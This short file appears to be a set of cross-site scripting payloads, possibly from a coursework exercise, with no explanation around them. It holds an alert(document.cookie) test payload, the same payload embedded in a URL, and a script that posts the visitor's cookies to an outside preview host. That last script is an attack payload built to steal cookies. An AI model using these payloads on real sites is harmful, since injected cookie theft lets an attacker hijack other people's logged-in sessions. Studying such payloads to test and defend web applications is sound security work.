<p> <script> alert(document.cookie) </script> </p>
url/?<p> <script> alert(document.cookie) </script> </p>

<p> <script> var xhr = new XMLHttpRequest();
xhr.open("POST",https://oli919-code50-88020993-5gr4q6v4pc75j7-8080.githubpreview.dev/test, true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
xhr.send(JSON.stringify({
    value: document.cookie
}));</script>